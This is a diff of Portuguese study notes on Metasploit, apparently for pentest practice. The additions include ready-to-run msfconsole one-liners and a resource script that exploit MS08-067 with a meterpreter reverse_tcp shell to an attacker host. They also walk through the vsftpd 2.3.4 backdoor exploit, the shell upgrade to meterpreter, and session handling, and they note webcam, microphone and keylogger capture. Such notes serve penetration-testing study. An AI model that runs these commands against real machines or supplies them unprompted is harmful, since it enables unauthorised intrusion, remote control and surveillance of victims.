@@ -1,3 +1,7 @@
+<<< Os exemplos vistos nesse arquivo são de exploração Server-side>>>
+<<<<<<Ou seja, o cliente se conecta a vitima, seja de forma direta ou reversa>>>>
+
+
 Metasploit - Identifica e explora vulnerabilidade
 -Utiliza payloads - Codigos maliciosos que visam ganhar acesso indevido ao sistema
 -É baseado em python, podendo criar extenções e etc
@@ -51,6 +55,10 @@ search firefox
 
 Faz pesquisa de xploits de 2016 encontrados no lado do cliente (browsers, serviços e etc)
 search cve:2016 type:exploit app:client
+
+Pesquisa usando filtro:
+
+grep -i reverse_tcp search windows/vncinject       (O comando buscara os exploits windows/vncinject filrando pelo reverse_tcp)
 
 Verificação do exploit e informações dos sistemas vulneraveis e aplicação do exploit:
 info exploit/windows/smb/ms08_067_netapi
@@ -136,10 +144,99 @@ killav - Tenta matar processos do antivirus
 checkvm - tenta identificar plataforma da maquina (caso seja maquina virtual)
 
 Para verificar scripts disponiveis:
-search post/windows  (o "post" é de pós exploração e o "windows" a plataforma que utilizará)
---------------------------------------------------------------------------------------
-Gerar XML com nmap
-NMAP: 
 
-Faz a varredura e gera um arquivo XML dos resultados
-nmap -A -oX resultado.xml 192.168.1.0/24
+
+post/windows  (o "post" é de pós exploração e o "windows" a plataforma que utilizará)
+--------------------------------------------------------------------------------------
+
+Executando o msfconsole em apenas uma linha:
+
+msfconsole -x
+
+Usando o exploit smb do windows, e o payload meterpreter com conexão reversa:
+msfconsole -x "use exploit/windows/smb/ms08_067_netapi; set RHOST 192.168.1.20; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.2; run"
+
+Com o payload bem sucedido, temos acesso total a maquina e podemos capturar desde o microfone, webcam, screanshot, keyloguer e arquivos do PC remoto.
+
+Caso precise sair em background da sessão, usar o comando:
+background
+
+Pode ser usado um script, para o comando "msconsole -x" não ficar tão grande, pode jogar o comando para um arquivo:
+
+Ex: arquivo.rc
+use exploit/windows/smb/ms08_067_netapi
+set RHOST 192.168.1.20
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.2; run"
+
+Para executar:
+
+msfconsole -r arquivo.rc
+--------------------------------------------------------
+
+Muitas veses para fazer um exploit, é preciso verificar se existe a necessidade de usar um target:
+
+show target
+
+Caso haja mais de 1 target possivel (Alvo), setar o target a ser utilizado:
+
+set target 1   (os targets estarão listados por numero, seguido do nome)
+
+O msfconsole, tem um "netcat" interno, que é invocado pelo comando connect para testar as portas:
+
+connect 192.168.1.2 110
+      (O comando acima funcionara como o netcat, ou telnet, e exibira se a porta esta em uso e mostrará o banner, caso esteja)
+      
+
+----------------------------------------------------
+
+Explorando a falha do vsftpd:
+
+search vsftpd    (exploit/unix/ftp/vsftpd_234_backdoor)
+
+use exploit/unix/ftp/vsftpd_234_backdoor
+
+show options
+
+set RHOST 192.168.1.20
+
+show payloads
+
+set PAYLOAD cmd/unix/interact
+
+exploit
+
+#Nesse ponto ja tera acesso ao shell
+
+Para adquirir acesso com o meterpreter, deixar a sessão em background:
+
+ctrl+Z
+
+Verificar a sessão ativa:
+
+sessions -l
+
+Dazer o upgrade para o meterpreter:
+
+sessions -u
+
+Abrindo a sessão meterpreter, é necessario verificar qual a sesão que abriu, e se precisar, remover as que não serão mais utilizadas:
+
+sessions -l
+
+sessions -k 1
+
+sessions -i 3
+
+Para ter acesso ao shell da maquina:
+
+shell
+
+(OBS):: O comando "exploit" e "run" executam o exploit de forma igual, ha o comando "check" em alguns payloads que permite apenas verifiar se o sistema é vulneravel e não explora a vulnerabilidade. 
+
+OBS: Os payload que estão como "stager", não possuem todos os codigos necessarios para abrir conexão com a vitima, e precisam do multhandler, que funcionará como um servidor para realizar essa conexão)
+     Os payload que estão como "inline", ja conectam e possuem os codigos para acesso total na vitima
+
+
+
+
